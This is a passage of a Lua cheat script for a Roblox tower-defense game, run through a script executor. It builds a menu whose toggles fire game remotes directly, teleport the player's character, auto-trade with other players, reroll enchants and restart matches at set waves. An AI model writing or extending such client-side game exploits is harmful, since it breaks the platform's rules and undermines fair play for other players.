        if not getgenv().PlaceAnywhereEnabled or gameProcessedEvent then return end
        
        ErrorHandler:wrapAsync(function()
            local unitName, unitCFrame = getgenv()._PlaceAnywhereHelpers.getUnitAtMouse()
            if unitName and unitCFrame then
                local placeRemote = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("PlaceTower")
                if placeRemote then
                    placeRemote:FireServer(unitName, unitCFrame)
                    debugPrint("[Place Anywhere] Placed " .. unitName)
                    
                    Window:Notify({
                        Title = "Place Anywhere",
                        Description = "Placed " .. unitName,
                        Lifetime = 2
                    })
                end
            end
        end)
    end)
end

if not getgenv().AutoVolcanoEnabled then
    getgenv().AutoVolcanoEnabled = getgenv().Config.toggles.AutoVolcanoToggle or false
end

createToggle(
    Sections.MiscLeft,
    "Auto Volcano",
    "AutoVolcanoToggle",
    function(value)
        getgenv().AutoVolcanoEnabled = value
        Window:Notify({
            Title = "Auto Volcano",
            Description = value and "Enabled - Auto-activating volcanoes" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().AutoVolcanoEnabled
)

if not isInLobby then
    task.spawn(function()
        local pollingInterval = MobileOptimizer:getPollingInterval(2)
        
        while true do
            task.wait(pollingInterval)
            
            if getgenv().AutoVolcanoEnabled then
                ErrorHandler:wrapAsync(function()
                    local gamemode = RS:FindFirstChild("Gamemode")
                    local mapName = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("MapName")
                    
                    if gamemode and gamemode.Value == "Dungeon" and mapName and mapName.Value == "Infernal Volcano" then
                        local volcano = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("Volcanoes") and workspace.Map.Volcanoes:FindFirstChild("Volcano")
                        
                        if volcano then
                            local remotes = RS:FindFirstChild("Remotes")
                            local volcanoRemote = remotes and remotes:FindFirstChild("VolcanoRemote")
                            
                            if volcanoRemote then
                                volcanoRemote:FireServer(volcano)
                                debugPrint("[Auto Volcano] Activated")
                            end
                        end
                    end
                end)
            end
        end
    end)
end

if not getgenv().AutoOrbEnabled then
    getgenv().AutoOrbEnabled = getgenv().Config.toggles.AutoOrbToggle or false
end

createToggle(
    Sections.MiscLeft,
    "Auto Orb",
    "AutoOrbToggle",
    function(value)
        getgenv().AutoOrbEnabled = value
        Window:Notify({
            Title = "Auto Orb",
            Description = value and "Enabled - Auto-collecting orbs" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().AutoOrbEnabled
)

if not isInLobby then
    task.spawn(function()
        local pollingInterval = MobileOptimizer:getPollingInterval(1)
        
        while true do
            task.wait(pollingInterval)
            
            if getgenv().AutoOrbEnabled then
                ErrorHandler:wrapAsync(function()
                    local gamemode = RS:FindFirstChild("Gamemode")
                    local mapName = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("MapName")
                    
                    local shouldCollect = false
                    
                    if gamemode then
                        if gamemode.Value == "BossRush" then
                            shouldCollect = true
                        elseif gamemode.Value == "Dungeon" and mapName and mapName.Value == "Warehouse" then
                            shouldCollect = true
                        end
                    end
                    
                    if shouldCollect then
                        local orb = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("ActiveOrbs") and workspace.Map.ActiveOrbs:FindFirstChild("Orb")
                        
                        if orb then
                            local remotes = RS:FindFirstChild("Remotes")
                            local interactEvent = remotes and remotes:FindFirstChild("Interact")
                            
                            if interactEvent then
                                interactEvent:FireServer(orb)
                                debugPrint("[Auto Orb] Collected")
                            end
                        end
                    end
                end)
            end
        end
    end)
end

if not getgenv().AntiMagicZoneEnabled then
    getgenv().AntiMagicZoneEnabled = getgenv().Config.toggles.AntiMagicZoneToggle or false
end

createToggle(
    Sections.MiscLeft,
    "Anti Magic Zone",
    "AntiMagicZoneToggle",
    function(value)
        getgenv().AntiMagicZoneEnabled = value
        Window:Notify({
            Title = "Anti Magic Zone",
            Description = value and "Enabled - Teleporting away from magic zones" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().AntiMagicZoneEnabled
)

if not isInLobby then
    task.spawn(function()
        local pollingInterval = MobileOptimizer:getPollingInterval(10)
        
        while true do
            task.wait(pollingInterval)
            
            if getgenv().AntiMagicZoneEnabled then
                pcall(function()
                    local gamemode = RS:FindFirstChild("Gamemode")
                    
                    if gamemode and gamemode.Value == "BossRush" then
                        local zoneHitbox = workspace:FindFirstChild("EffectZones") and workspace.EffectZones:FindFirstChild("ZoneHitbox")
                        
                        if zoneHitbox and zoneHitbox:IsA("BasePart") then
                            local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                            
                            if hrp then
                                hrp.CFrame = zoneHitbox.CFrame
                                debugPrint("[Anti Magic Zone] Teleported")
                            end
                        end
                    end
                end)
            end
        end
    end)
end


Sections.MiscRight:Header({ Text = "ℹ️ Information" })
Sections.MiscRight:SubLabel({ Text = "Important notes and warnings" })

Sections.MiscRight:Divider()

Sections.MiscRight:SubLabel({
    Text = "⚠️ Do NOT enable Auto Execute if you already have this script in your executor's auto-execute folder!"
})

Sections.MiscRight:SubLabel({
    Text = "💡 FPS Boost is only available in-game. Remove Enemies and Black Screen Mode provide performance boosts."
})


Sections.SettingsLeft:Header({ Text = "⚙️ UI Settings" })

createToggle(
    Sections.SettingsLeft,
    "Debug Mode",
    "DebugMode",
    function(value)
        getgenv().DebugMode = value
        Window:Notify({
            Title = "Debug Mode",
            Description = (value and "Enabled" or "Disabled") .. " - Shows detailed console logs",
            Lifetime = 3
        })
    end,
    false
)

Sections.SettingsLeft:SubLabel({ Text = "Enable to see detailed console logs for troubleshooting" })

Sections.SettingsLeft:Divider()

getgenv()._getValidKeyCode = function(keyName, fallback)
    if not keyName or keyName == "" then return Enum.KeyCode[fallback] end
    local success, keyCode = pcall(function()
        return Enum.KeyCode[keyName]
    end)
    if success and keyCode then
        return keyCode
    else
        getgenv().Config.inputs["MenuKeybind"] = fallback
        getgenv().SaveConfig(getgenv().Config)
        return Enum.KeyCode[fallback]
    end
end

getgenv()._menuKeybind = Sections.SettingsLeft:Keybind({
    Name = "Menu Toggle",
    Default = getgenv()._getValidKeyCode(getgenv().Config.inputs["MenuKeybind"], "LeftControl"),
    Callback = function(key)
        Window:SetKeybind(key)
        getgenv().Config.inputs["MenuKeybind"] = key.Name
        getgenv().SaveConfig(getgenv().Config)
        Window:Notify({
            Title = "Keybind Updated",
            Description = "Menu toggle set to " .. key.Name,
            Lifetime = 3
        })
    end,
}, "MenuKeybind")

if getgenv().Config.inputs["MenuKeybind"] then
    pcall(function()
        local validKey = getgenv()._getValidKeyCode(getgenv().Config.inputs["MenuKeybind"], "LeftControl")
        Window:SetKeybind(validKey)
    end)
end

Sections.SettingsLeft:Divider()

Sections.SettingsLeft:Header({ Text = "🖥️ UI Size (Restart Required)" })
Sections.SettingsLeft:SubLabel({ Text = "Custom window size - changes apply on next script load" })

createInput(
    Sections.SettingsLeft,
    "Width",
    "UIWidth",
    "Default: 580 (mobile) or 868 (desktop)",
    "Numeric",
    function(value)
        local width = tonumber(value)
        if width and width >= 400 and width <= 1920 then
            getgenv().Config.inputs.UIWidth = width
            saveConfig(getgenv().Config)
            Window:Notify({
                Title = "UI Width",
                Description = "Set to " .. width .. " (restart to apply)",
                Lifetime = 3
            })
        end
    end,
    tostring(getgenv().Config.inputs.UIWidth or (isMobile and 580 or 868))
)

createInput(
    Sections.SettingsLeft,
    "Height",
    "UIHeight",
    "Default: 480 (mobile) or 650 (desktop)",
    "Numeric",
    function(value)
        local height = tonumber(value)
        if height and height >= 300 and height <= 1080 then
            getgenv().Config.inputs.UIHeight = height
            saveConfig(getgenv().Config)
            Window:Notify({
                Title = "UI Height",
                Description = "Set to " .. height .. " (restart to apply)",
                Lifetime = 3
            })
        end
    end,
    tostring(getgenv().Config.inputs.UIHeight or (isMobile and 480 or 650))
)

Sections.SettingsLeft:Divider()

Sections.SettingsLeft:Header({ Text = "💾 Configuration" })

Sections.SettingsLeft:Button({
    Name = "💾 Save Config",
    Callback = function()
        local success = saveConfig(getgenv().Config)
        if success then
            Window:Notify({
                Title = "Config",
                Description = "Settings saved successfully!",
                Lifetime = 3
            })
        else
            Window:Notify({
                Title = "Config",
                Description = "Failed to save settings!",
                Lifetime = 5
            })
        end
    end
})

Sections.SettingsLeft:Button({
    Name = "📁 Load Config",
    Callback = function()
        getgenv().Config = loadConfig()
        Window:Notify({
            Title = "Config",
            Description = "Config loaded! Restart script to apply.",
            Lifetime = 5
        })
    end
})

Sections.SettingsRight:Header({ Text = "🔧 Utility Actions" })

Sections.SettingsRight:Button({
    Name = "📊 Memory Report",
    Callback = function()
        local report = getMemoryReport()
        print(report)
        
        Window:Notify({
            Title = "Memory Report",
            Description = "Check console (F9) for report",
            Lifetime = 3
        })
    end
})

Sections.SettingsRight:Button({
    Name = "🔌 Connection Manager Stats",
    Callback = function()
        local stats = ConnectionManager:getStats()
        local report = string.format(
            "\n=== Connection Manager Stats ===\n" ..
            "Active Connections: %d\n" ..
            "Tower Connections: %d\n" ..
            "Named Groups: %d\n" ..
            "Total Tracked: %d\n" ..
            "Total Cleaned: %d\n" ..
            "Last Cleanup: %.1fs ago\n" ..
            "================================\n",
            stats.active,
            stats.towers,
            stats.groups,
            stats.totalTracked,
            stats.totalCleaned,
            tick() - stats.lastCleanup
        )
        print(report)
        
        Window:Notify({
            Title = "Connection Manager",
            Description = string.format("%d active, %d cleaned", stats.active, stats.totalCleaned),
            Lifetime = 3
        })
    end
})

Sections.SettingsRight:Button({
    Name = "🧹 Force Memory Cleanup",
    Callback = function()
        local beforeMem = getMemoryUsageMB()
        
        pcall(function() collectgarbage("collect") end)
        task.wait(0.1)
        pcall(function() collectgarbage("collect") end)
        
        local afterMem = getMemoryUsageMB()
        local freed = beforeMem - afterMem
        
        Window:Notify({
            Title = "Memory Cleanup",
            Description = string.format("Freed %.1f MB", freed),
            Lifetime = 3
        })
        
        print(getMemoryReport())
    end
})

Sections.SettingsRight:Button({
    Name = "🌐 Server Hop (Safe)",
    Callback = function()
        if not getgenv()._LastServerHopTime then
            getgenv()._LastServerHopTime = 0
        end
        
        local currentTime = tick()
        local timeSinceLastHop = currentTime - getgenv()._LastServerHopTime
        local MIN_COOLDOWN = 15
        
        if timeSinceLastHop < MIN_COOLDOWN then
            local waitTime = MIN_COOLDOWN - timeSinceLastHop
            Window:Notify({
                Title = "Server Hop",
                Description = "Please wait " .. math.ceil(waitTime) .. "s before hopping again",
                Lifetime = 3
            })
            return
        end
        
        Window:Notify({
            Title = "Server Hop",
            Description = "Cleaning up and hopping to new server...",
            Lifetime = 3
        })
        task.spawn(function()
            pcall(function()
                if getgenv().MacroEnabled then
                    getgenv().MacroEnabled = false
                end
                if getgenv().AutoJoinEnabled then
                    getgenv().AutoJoinEnabled = false
                end
            end)
            
            task.wait(2)
            
            cleanupBeforeTeleport()
            
            task.wait(2)
            
            local maxRetries = 3
            local retryDelay = 5
            
            for attempt = 1, maxRetries do
                local ok, err = pcall(function()
                    TeleportService:Teleport(game.PlaceId, LocalPlayer)
                end)
                
                if ok then
                    getgenv()._LastServerHopTime = tick()
                    print("[Server Hop] Teleport initiated (Attempt " .. attempt .. ")")
                    break
                else
                    local errorMsg = tostring(err)
                    if errorMsg:find("277") or errorMsg:find("Disconnected") then
                        warn("[Server Hop] Error 277 detected, waiting longer before retry...")
                        retryDelay = 20
                    else
                        warn("[Server Hop] Attempt " .. attempt .. "/" .. maxRetries .. " failed:", err)
                    end
                    
                    if attempt < maxRetries then
                        print("[Server Hop] Retrying in " .. retryDelay .. "s...")
                        task.wait(retryDelay)
                        retryDelay = math.min(retryDelay * 1.5, 45)
                    else
                        Window:Notify({
                            Title = "Server Hop",
                            Description = "Failed after " .. maxRetries .. " attempts. Try again later.",
                            Lifetime = 5
                        })
                    end
                end
            end
        end)
    end
})



getgenv().BreachAutoJoin = getgenv().BreachAutoJoin or {}
getgenv().BreachEnabled = getgenv().Config.toggles.BreachToggle or false

Sections.BreachLeft:Header({ Text = "🛡️ Breach Auto-Join" })
Sections.BreachLeft:SubLabel({ Text = "Automatically join specific Breach modes" })

createToggle(
    Sections.BreachLeft,
    "Enable Breach Auto-Join",
    "BreachToggle",
    function(value)
        getgenv().BreachEnabled = value
        Window:Notify({
            Title = "Breach Auto-Join",
            Description = value and "Enabled" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().BreachEnabled
)

Sections.BreachLeft:Divider()

Sections.BreachLeft:Header({ Text = "📋 Available Breaches" })
Sections.BreachLeft:SubLabel({ Text = "Select which breaches to auto-join" })

local breachesLoaded = false
pcall(function()
    local mapParamsModule = RS:FindFirstChild("Modules") and RS.Modules:FindFirstChild("Breach") and RS.Modules.Breach:FindFirstChild("MapParameters")
    if mapParamsModule and mapParamsModule:IsA("ModuleScript") then
        local mapParams = require(mapParamsModule)
        if mapParams and next(mapParams) then
            local breachList = {}
            for breachName, breachInfo in pairs(mapParams) do
                table.insert(breachList, { name = breachName, disabled = breachInfo.Disabled or false })
            end
            table.sort(breachList, function(a,b) return a.name < b.name end)
            
            for _, breach in ipairs(breachList) do
                local breachKey = "Breach_" .. breach.name
                local savedState = getgenv().Config.toggles[breachKey] or false
                
                if not getgenv().BreachAutoJoin[breach.name] then
                    getgenv().BreachAutoJoin[breach.name] = savedState
                end
                
                local statusText = breach.disabled and " [DISABLED]" or ""
                createToggle(
                    Sections.BreachLeft,
                    breach.name .. statusText,
                    breachKey,
                    function(value)
                        getgenv().BreachAutoJoin[breach.name] = value
                    end,
                    savedState
                )
            end
            breachesLoaded = true
        end
    end
end)

if not breachesLoaded then
    Sections.BreachLeft:SubLabel({
        Text = "⚠️ Could not load breach data. The module may not be available."
    })
end


Sections.BreachRight:Header({ Text = "👹 Sukuna's Fingers" })
Sections.BreachRight:SubLabel({ Text = "Automatically unleash Sukuna's fingers" })

getgenv().AutoUnleashSukunaEnabled = getgenv().Config.toggles.AutoUnleashSukunaToggle or false

createToggle(
    Sections.BreachRight,
    "Auto Unleash Sukuna's Fingers",
    "AutoUnleashSukunaToggle",
    function(value)
        getgenv().AutoUnleashSukunaEnabled = value
        Window:Notify({
            Title = "Sukuna's Fingers",
            Description = value and "Auto-unleash enabled" or "Auto-unleash disabled",
            Lifetime = 3
        })
    end,
    getgenv().AutoUnleashSukunaEnabled
)

Sections.BreachRight:Divider()

Sections.BreachRight:SubLabel({
    Text = "When enabled, the script will automatically teleport to and interact with the shrine to unleash Sukuna's fingers."
})


do
Sections.FinalExpeditionLeft:Header({ Text = "🏔️ Auto Join" })
Sections.FinalExpeditionLeft:SubLabel({ Text = "Automatically join Final Expedition with your preferred difficulty" })

createToggle(
    Sections.FinalExpeditionLeft,
    "Auto Join Easy",
    "FinalExpAutoJoinEasyToggle",
    function(value)
        getgenv().FinalExpAutoJoinEasyEnabled = value
        if value and getgenv().FinalExpAutoJoinHardEnabled then
            getgenv().FinalExpAutoJoinHardEnabled = false
            getgenv().Config.toggles.FinalExpAutoJoinHardToggle = false
            saveConfig(getgenv().Config)
            pcall(function()
                if getgenv().FinalExpAutoJoinHardToggle then
                    getgenv().FinalExpAutoJoinHardToggle:UpdateState(false)
                end
            end)
        end
        Window:Notify({
            Title = "Final Expedition",
            Description = value and "Auto Join Easy Enabled" or "Auto Join Easy Disabled",
            Lifetime = 3
        })
    end,
    getgenv().FinalExpAutoJoinEasyEnabled
)

getgenv()._finalExpHardToggle = createToggle(
    Sections.FinalExpeditionLeft,
    "Auto Join Hard",
    "FinalExpAutoJoinHardToggle",
    function(value)
        getgenv().FinalExpAutoJoinHardEnabled = value
        if value and getgenv().FinalExpAutoJoinEasyEnabled then
            getgenv().FinalExpAutoJoinEasyEnabled = false
            getgenv().Config.toggles.FinalExpAutoJoinEasyToggle = false
            saveConfig(getgenv().Config)
            pcall(function()
                if getgenv().FinalExpAutoJoinEasyToggle then
                    getgenv().FinalExpAutoJoinEasyToggle:UpdateState(false)
                end
            end)
        end
        Window:Notify({
            Title = "Final Expedition",
            Description = value and "Auto Join Hard Enabled" or "Auto Join Hard Disabled",
            Lifetime = 3
        })
    end,
    getgenv().FinalExpAutoJoinHardEnabled
)

getgenv().FinalExpAutoJoinHardToggle = getgenv()._finalExpHardToggle

Sections.FinalExpeditionLeft:SubLabel({
    Text = "⚠️ Only enable ONE auto join option at a time"
})

Sections.FinalExpeditionRight:Header({ Text = "⚙️ Automation" })
Sections.FinalExpeditionRight:SubLabel({ Text = "Additional automation options" })

createToggle(
    Sections.FinalExpeditionRight,
    "Auto Skip Shop",
    "FinalExpAutoSkipShopToggle",
    function(value)
        getgenv().FinalExpAutoSkipShopEnabled = value
        Window:Notify({
            Title = "Final Expedition",
            Description = value and "Auto Skip Shop Enabled" or "Auto Skip Shop Disabled",
            Lifetime = 3
        })
    end,
    getgenv().FinalExpAutoSkipShopEnabled
)

Sections.FinalExpeditionRight:SubLabel({
    Text = "Automatically skips the shop selection when available"
})

Sections.FinalExpeditionRight:Divider()

createToggle(
    Sections.FinalExpeditionRight,
    "Skip Rewards",
    "FinalExpSkipRewardsToggle",
    function(value)
        getgenv().FinalExpSkipRewardsEnabled = value
        Window:Notify({
            Title = "Final Expedition",
            Description = value and "Skip Rewards Enabled" or "Skip Rewards Disabled",
            Lifetime = 3
        })
    end,
    getgenv().FinalExpSkipRewardsEnabled
)

Sections.FinalExpeditionRight:SubLabel({
    Text = "Automatically skips reward screens"
})

Sections.FinalExpeditionRight:Divider()

Sections.FinalExpeditionRight:Header({ Text = "🎯 Auto Select Mode" })
Sections.FinalExpeditionRight:SubLabel({ Text = "Automatically select Rest/Dungeon/Double Dungeon/Shop based on priority (1=highest, 4=lowest)" })

createToggle(
    Sections.FinalExpeditionRight,
    "Enable Auto Select Mode",
    "FinalExpAutoSelectModeToggle",
    function(value)
        getgenv().FinalExpAutoSelectModeEnabled = value
        Window:Notify({
            Title = "Final Expedition",
            Description = value and "Auto Select Mode Enabled" or "Auto Select Mode Disabled",
            Lifetime = 3
        })
    end,
    getgenv().FinalExpAutoSelectModeEnabled
)

createInput(
    Sections.FinalExpeditionRight,
    "Rest Priority (1-4)",
    "FinalExpRestPriority",
    "3",
    "Numeric",
    function(value)
        local num = tonumber(value) or 3
        if num < 1 then num = 1 end
        if num > 4 then num = 4 end
        getgenv().FinalExpRestPriority = num
    end
)

createInput(
    Sections.FinalExpeditionRight,
    "Dungeon Priority (1-4)",
    "FinalExpDungeonPriority",
    "1",
    "Numeric",
    function(value)
        local num = tonumber(value) or 1
        if num < 1 then num = 1 end
        if num > 4 then num = 4 end
        getgenv().FinalExpDungeonPriority = num
    end
)

createInput(
    Sections.FinalExpeditionRight,
    "Double Dungeon Priority (1-4)",
    "FinalExpDoubleDungeonPriority",
    "2",
    "Numeric",
    function(value)
        local num = tonumber(value) or 2
        if num < 1 then num = 1 end
        if num > 4 then num = 4 end
        getgenv().FinalExpDoubleDungeonPriority = num
    end
)

createInput(
    Sections.FinalExpeditionRight,
    "Shop Priority (1-4)",
    "FinalExpShopPriority",
    "4",
    "Numeric",
    function(value)
        local num = tonumber(value) or 4
        if num < 1 then num = 1 end
        if num > 4 then num = 4 end
        getgenv().FinalExpShopPriority = num
    end
)

Sections.FinalExpeditionRight:SubLabel({
    Text = "1 = Highest priority, 3 = Lowest priority"
})


Sections.SeamlessFixLeft:Header({ Text = "🔄 Automation Settings" })
Sections.SeamlessFixLeft:Divider()

Sections.SeamlessFixLeft:Header({ Text = "💡 Seamless Fix" })
Sections.SeamlessFixLeft:SubLabel({
    Text = "Ensures the script continues running smoothly when you teleport between game instances"
})

Sections.SeamlessFixLeft:Divider()

Sections.SeamlessFixLeft:Header({ Text = "⚙️ Settings" })

createToggle(
    Sections.SeamlessFixLeft,
    "Enable Seamless Fix",
    "SeamlessFixToggle",
    function(value)
        getgenv().SeamlessFixEnabled = value
        
        task.spawn(function()
            pcall(function()
                local remotes = RS:FindFirstChild("Remotes")
                local setSettings = remotes and remotes:FindFirstChild("SetSettings")
                if setSettings then 
                    setSettings:InvokeServer("SeamlessRetry")
                end
            end)
        end)
        
        Window:Notify({
            Title = "Seamless Fix",
            Description = value and "Enabled - Script will persist through teleports" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().SeamlessFixEnabled
)

createInput(
    Sections.SeamlessFixLeft,
    "Rounds Before Restart",
    "SeamlessRounds",
    "Enter number of rounds (e.g., 4)",
    "Numeric",
    function(value)
        getgenv().SeamlessRounds = tonumber(value) or 4
        Window:Notify({
            Title = "Seamless Fix",
            Description = "Will restart after " .. (tonumber(value) or 4) .. " rounds",
            Lifetime = 3
        })
    end,
    tostring(getgenv().Config.inputs.SeamlessRounds or "4")
)

Sections.SeamlessFixLeft:SubLabel({
    Text = "Script will automatically restart after this many rounds to prevent issues"
})

Sections.SeamlessFixRight:Header({ Text = "🔄 Wave Restart" })
Sections.SeamlessFixRight:SubLabel({
    Text = "Automatically restart the match when reaching a specific wave"
})

if not getgenv().InfiniteRestartEnabled then
    getgenv().InfiniteRestartEnabled = getgenv().Config.toggles.InfiniteRestartToggle or false
end

if not getgenv().InfiniteRestartWave then
    getgenv().InfiniteRestartWave = tonumber(getgenv().Config.inputs.InfiniteRestartWave) or 50
end

createToggle(
    Sections.SeamlessFixRight,
    "Enable Wave Restart",
    "InfiniteRestartToggle",
    function(value)
        getgenv().InfiniteRestartEnabled = value
        Window:Notify({
            Title = "Wave Restart",
            Description = value and "Enabled - Will restart at wave " .. getgenv().InfiniteRestartWave or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().InfiniteRestartEnabled
)

createInput(
    Sections.SeamlessFixRight,
    "Restart at Wave",
    "InfiniteRestartWave",
    "Enter wave number (e.g., 50)",
    "Numeric",
    function(value)
        getgenv().InfiniteRestartWave = tonumber(value) or 50
        Window:Notify({
            Title = "Wave Restart",
            Description = "Will restart at wave " .. (tonumber(value) or 50),
            Lifetime = 3
        })
    end,
    tostring(getgenv().InfiniteRestartWave)
)

Sections.SeamlessFixRight:SubLabel({
    Text = "Match will automatically restart when the wave counter reaches this number"
})

Sections.SeamlessFixRight:Divider()
Sections.SeamlessFixRight:Header({ Text = "🔮 Auto Enchant" })
Sections.SeamlessFixRight:SubLabel({
    Text = "Automatically reroll enchants on your units until you get the desired one"
})

getgenv()._autoEnchantSuccess, getgenv()._autoEnchantErr = pcall(function()
    createToggle(
        Sections.SeamlessFixRight,
        "Auto Enchant",
        "AutoEnchant",
        function(value)
            getgenv().AutoEnchantEnabled = value
            Window:Notify({
                Title = "Auto Enchant",
                Description = value and "Enabled" or "Disabled",
                Lifetime = 3
            })
        end,
        false
    )
    
    getgenv()._autoEnchantUnitDropdown = createDropdown(
        Sections.SeamlessFixRight,
        "Unit Selection",
        "AutoEnchantUnit",
        {"Loading units..."},
        false,
        function(value)
            getgenv().AutoEnchantUnit = value
        end,
        getgenv().AutoEnchantUnit
    )
    
    task.spawn(function()
        task.wait(3)
        
        local unitOptions = {}
        local units = getgenv()._getPlayerUnits()
        for _, unit in ipairs(units) do
            table.insert(unitOptions, unit.display)
        end
        
        if #unitOptions == 0 then
            table.insert(unitOptions, "No units found")
        end
        
        if getgenv()._autoEnchantUnitDropdown and getgenv()._autoEnchantUnitDropdown.ClearOptions and getgenv()._autoEnchantUnitDropdown.InsertOptions then
            pcall(function()
                getgenv()._autoEnchantUnitDropdown:ClearOptions()
                getgenv()._autoEnchantUnitDropdown:InsertOptions(unitOptions)
            end)
        end
    end)
    
    createDropdown(
        Sections.SeamlessFixRight,
        "Material",
        "AutoEnchantMaterial",
        {"Pearl", "DuskPearl"},
        false,
        function(value)
            getgenv().AutoEnchantMaterial = value
        end,
        getgenv().AutoEnchantMaterial
    )
    
    createDropdown(
        Sections.SeamlessFixRight,
        "Desired Enchants (Multi-Select)",
        "AutoEnchantDesiredEnchants",
        {"Defense", "Knowledge", "Attack", "Strength", "Annihilation", "Efficiency", "Ruthless", "Mastery", "Omnipotent", "Magical", "Glorious", "Midas", "Mystical"},
        true,
        function(value)
            getgenv().AutoEnchantDesiredEnchants = value
            getgenv().Config.inputs = getgenv().Config.inputs or {}
            getgenv().Config.inputs.AutoEnchantDesiredEnchants = value
            saveConfig(getgenv().Config)
        end,
        getgenv().AutoEnchantDesiredEnchants
    )
end)
if not getgenv()._autoEnchantSuccess then
    warn("[UI ERROR] Auto Enchant UI failed:", getgenv()._autoEnchantErr)
end

do

Sections.AutoTradeLeft:Header({ Text = "🤝 Auto Trade" })
Sections.AutoTradeLeft:SubLabel({ Text = "Automatically send and accept trades with other players" })

createToggle(
    Sections.AutoTradeLeft,
    "Auto Send Trade",
    "AutoTradePlayerToggle",
    function(value)
        getgenv().AutoTradePlayerEnabled = value
        Window:Notify({
            Title = "Auto Send Trade",
            Description = value and "Enabled - Will send trade to " .. (getgenv().AutoTradeTargetPlayer or "selected player") or "Disabled",
            Lifetime = 3
        })
    end,
    false
)

getgenv()._autoTradePlayerDropdown = createDropdown(
    Sections.AutoTradeLeft,
    "Target Player",
    "AutoTradeTargetPlayer",
    getPlayerList(),
    false,
    function(value)
        getgenv().AutoTradeTargetPlayer = value
        Window:Notify({
            Title = "Target Player",
            Description = "Will send trade to " .. tostring(value),
            Lifetime = 3
        })
    end,
    getgenv().AutoTradeTargetPlayer
)

Sections.AutoTradeLeft:Divider()

createToggle(
    Sections.AutoTradeLeft,
    "Auto Accept Trade",
    "AutoAcceptTradeToggle",
    function(value)
        getgenv().AutoAcceptTradeEnabled = value
        local playerList = ""
        if getgenv().AutoAcceptTradeFromPlayers and type(getgenv().AutoAcceptTradeFromPlayers) == "table" then
            for key, val in pairs(getgenv().AutoAcceptTradeFromPlayers) do
                if type(val) == "boolean" and val == true then
                    playerList = playerList .. tostring(key) .. ", "
                elseif type(val) == "string" then
                    playerList = playerList .. tostring(val) .. ", "
                end
            end
            if playerList ~= "" then
                playerList = playerList:sub(1, -3)
            end
        end
        Window:Notify({
            Title = "Auto Accept Trade",
            Description = value and "Enabled - Will accept from: " .. (playerList ~= "" and playerList or "selected players") or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().AutoAcceptTradeEnabled
)

getgenv()._autoAcceptTradePlayerDropdown = createDropdown(
    Sections.AutoTradeLeft,
    "Accept From Players",
    "AutoAcceptTradeFromPlayers",
    getPlayerList(),
    true,
    function(value)
        getgenv().AutoAcceptTradeFromPlayers = value
        local playerList = ""
        if type(value) == "table" then
            for _, player in pairs(value) do
                playerList = playerList .. tostring(player) .. ", "
            end
            if playerList ~= "" then
                playerList = playerList:sub(1, -3)
            end
        end
        Window:Notify({
            Title = "Accept From Players",
            Description = "Will accept trades from: " .. (playerList ~= "" and playerList or "none"),
            Lifetime = 3
        })
    end,
    getgenv().AutoAcceptTradeFromPlayers
)

Sections.AutoTradeLeft:Divider()

createToggle(
    Sections.AutoTradeLeft,
    "Auto Ready",
    "AutoReadyTradeToggle",
    function(value)
        getgenv().AutoReadyTradeEnabled = value
        Window:Notify({
            Title = "Auto Ready",
            Description = value and "Enabled - Will auto ready in trades" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().AutoReadyTradeEnabled
)

Sections.AutoTradeRight:Header({ Text = "📦 Trade Items" })
Sections.AutoTradeRight:SubLabel({ Text = "Select items to add to the trade" })

if not getgenv()._GetAvailableItems then
    getgenv()._TradeItemsBuffer = getgenv()._TradeItemsBuffer or {}
    getgenv()._GetAvailableItems = function()
        local buf = getgenv()._TradeItemsBuffer
        table.clear(buf)
        local clientData = getgenv().GetClientData and getgenv().GetClientData()
        if clientData and clientData.ItemData then
            for itemName, itemData in pairs(clientData.ItemData) do
                local amt = itemData.Amount
                if amt and amt > 0 then
                    buf[#buf+1] = itemName
                end
            end
        end
        if #buf == 0 then
            buf[1] = "No items available"
        end
        table.sort(buf)
        return buf
    end
end

getgenv()._autoTradeItemsDropdown = createDropdown(
    Sections.AutoTradeRight,
    "Items to Trade",
    "AutoTradeItems",
    getgenv()._GetAvailableItems(),
    true,
    function(value)
        getgenv().AutoTradeItems = value
    end,
    getgenv().AutoTradeItems
)

do
    getgenv()._AutoTradeItemOptionsCache = getgenv()._AutoTradeItemOptionsCache or {}
    getgenv()._AutoTradeItemOptionsSeed = getgenv()._GetAvailableItems()
    for i = 1, #getgenv()._AutoTradeItemOptionsSeed do
        if getgenv()._AutoTradeItemOptionsSeed[i] ~= "No items available" then
            getgenv()._AutoTradeItemOptionsCache[getgenv()._AutoTradeItemOptionsSeed[i]] = true
        end
    end
end

task.spawn(function()
    while true do
        task.wait(10)
        local dd = getgenv()._autoTradeItemsDropdown
        if dd and getgenv()._GetAvailableItems then
            pcall(function()
                getgenv()._AutoTradeItemOptionsCache = getgenv()._AutoTradeItemOptionsCache or {}
                local known = getgenv()._AutoTradeItemOptionsCache
                local nowItems = getgenv()._GetAvailableItems()
                local toAdd = {}
                for _, name in ipairs(nowItems) do
                    if name ~= "No items available" and not known[name] then
                        table.insert(toAdd, name)
                        known[name] = true
                    end
                end
                if #toAdd > 0 and dd.InsertOptions then
                    dd:InsertOptions(toAdd)
                end
            end)
        end
    end
end)



if not isInLobby then
    task.spawn(function()
        local pollingInterval = MobileOptimizer:getPollingInterval(2)
        
        while true do
            task.wait(pollingInterval)
            
            if getgenv().InfiniteRestartEnabled or getgenv().TwoXTrackerEnabled then
                pcall(function()
                    local wave = RS:FindFirstChild("Wave")
                    if wave and wave.Value then
                        local currentWave = tonumber(wave.Value) or 0
                        local twoXActive = getgenv().TwoXActive
                        local targetWave
                        if twoXActive and getgenv().TwoXTrackerEnabled then
                            targetWave = tonumber(getgenv().TwoXResetWave) or tonumber(getgenv().InfiniteRestartWave) or 50
                        else
                            targetWave = tonumber(getgenv().InfiniteRestartWave) or 50
                        end
                        
                        if currentWave >= targetWave then
